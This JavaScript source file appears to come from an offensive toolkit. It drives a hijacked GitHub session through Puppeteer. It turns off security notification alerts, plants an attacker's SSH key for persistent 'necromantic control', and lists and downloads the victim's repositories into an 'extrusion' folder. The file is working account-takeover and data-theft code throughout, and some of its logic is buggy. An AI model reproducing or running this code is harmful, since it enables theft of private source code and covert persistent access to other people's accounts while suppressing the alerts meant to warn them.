const db = require('../../db/db')
const necrohelp = require('../../tasks/helpers/necrohelp')
const clusterLib = require('../../puppeteer/cluster')

exports.DisableDeployKeyAlert = async function(page, taskId){
    await page.goto('https://github.com/settings/notifications')

    await page.waitForTimeout(2000)

    // get the last switch for Deploy Key Alert and check if it is checked
    const isDeployKeyChecked = await page.evaluate('document.querySelectorAll(\'button[aria-labelledby="switchLabel"]\')[2].ariaChecked');


    if(isDeployKeyChecked === 'true'){
        // click to disable
        console.log(`[${taskId}] Deploy Key Alert Notification is ON. Disabling it...`);

        // TODO needs fixing to get properly the button
        const unchecks = await page.$$('button[aria-labelledby="switchLabel"]')
        for(let uncheck in unchecks){
            await page.click(uncheck)
            await page.waitForTimeout(1000)
        }

        await page.screenshot({path: `extrusion/screenshot_notifications-after_${taskId}.png`});
        console.log(`[${taskId}] Deploy Key Alert Notification now DISABLED.`);

    }else{
        //nothing to do
        console.log(`[${taskId}] Deploy Key Alert Notification is already disable, nothing to do..`);
    }

}

exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
    await page.goto('https://github.com/settings/ssh/new')

    await page.waitForTimeout(1000)

    const nameInput = 'input[name="ssh_key[title]"]'
    await page.click(nameInput)
    await page.type(nameInput, sshKeyName)

    const keyInput = 'textarea[name="ssh_key[key]"]'
    await page.click(keyInput)
    await page.type(keyInput, sshMaterial)

    await page.waitForTimeout(500)

    // click Add Key
    await page.click('button.btn-primary')

    await page.waitForTimeout(1000)

    // TODO sometimes depending on session timing probably,
    // TODO github asks for Password confirmation before adding the key
    // TODO so we should have the password here just in case.
    // TODO in general the TASK need to have session credentials if possible too.

    console.log(`[${taskId}] SSH key ${sshKeyName} added for necromantic control \\.oOo./`);

    await page.waitForTimeout(2000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    let extrudedHashKey = `plantedSshKey_${sshKeyName}`
    await db.AddExtrudedData(taskId, extrudedHashKey, sshMaterial)
}



exports.ScrapeRepos = async function(page, taskId) {
    await page.goto('https://github.com/settings/repositories')

    // ANTI fix	
    //let urls = await page.$$('div.Box-row.private.js-collab-repo > a')
    let urls = await page.$$('div.Box-row > a.mr-1')

    // TODO a warning or ignore should be thrown if the repo is too big
    // TODO as in hundreds of MB. Downloads of ZIPs of a few tens of MB is OK, but when it's too big
    // TODO puppeter doesn't handle it correctly
    // let urlContainers = await page.$$('div.Box-row.private.js-collab-repo')
    // then loop urlContainers to get out the SPAN and A elements. span contains the size

    console.log(`[${taskId}] there are ${urls.length} repos to fetch`)

    let reposToDownload = [];
    for(let url of urls){
        let href = await(await url.getProperty('href')).jsonValue();
        // TODO do the same for the 'main' branch!!!
	href = href + "/archive/refs/heads/master.zip"    
        reposToDownload.push(href);
        console.log(`[${taskId}] discovered repo at ${href}`)
    }
    return reposToDownload;
}

exports.DownloadRepo = async function (page, taskId, downloadUrl) {

    // TODO extruded directory needs to be in the config file
    await page._client.send('Page.setDownloadBehavior', {
        behavior: 'allow',
        downloadPath: clusterLib.GetConfig().platform.extrusionPath
    }).catch(console.error)

 try{
    	await page.goto(downloadUrl);
	await page.waitForTimeout(10000);
	
	// ANTI simplified instead of clicking on Code button, just go on .zip url:
	let archive = `${downloadUrl.split('/')[4]}-master.zip`;
	let extrudedHashKey = `repository_${archive}`;
        await db.AddExtrudedData(taskId, extrudedHashKey, path);

        // wait for zip to download. we don't have much control here
 } catch(e){}
    /*	 
    // click on the Code green button
    const codeButton = await page.$(".file-navigation > .d-none > get-repo > .position-relative > .btn");

    let archive = `${downloadUrl.split('/')[4]}-master.zip`
    let path = `${clusterLib.GetConfig().platform.extrusionPath}/${archive}`

    // process next clicks including alert dialog ones
    if (typeof codeButton !== 'undefined' && codeButton !== null){

        console.log(`[${taskId}] downloading repo ${archive}`);
        await page.click('.file-navigation > .d-none > get-repo > .position-relative > .btn').catch(console.error)

        // click on the Download Zip last link
        // NOTE this check handles the missing Open with GithubDesktop on platforms not supported.
        // the div is missing so the nth-child count changes
        let nthChild = 2;
        if(clusterLib.GetConfig().platform.type === "freebsd"){
            nthChild = 1;
        }

        await page.click('.dropdown-menu > div > .list-style-none > .Box-row:nth-child(' + nthChild + ') > .d-flex').catch(console.error)

        let extrudedHashKey = `repository_${archive}`
        await db.AddExtrudedData(taskId, extrudedHashKey, path)

        // wait for zip to download. we don't have much control here
        await page.waitForTimeout(10000)
    }else{
        console.log(`[${taskId}] repo ${archive} is missing the Code button. Ignoring it ...`)
    } */
}
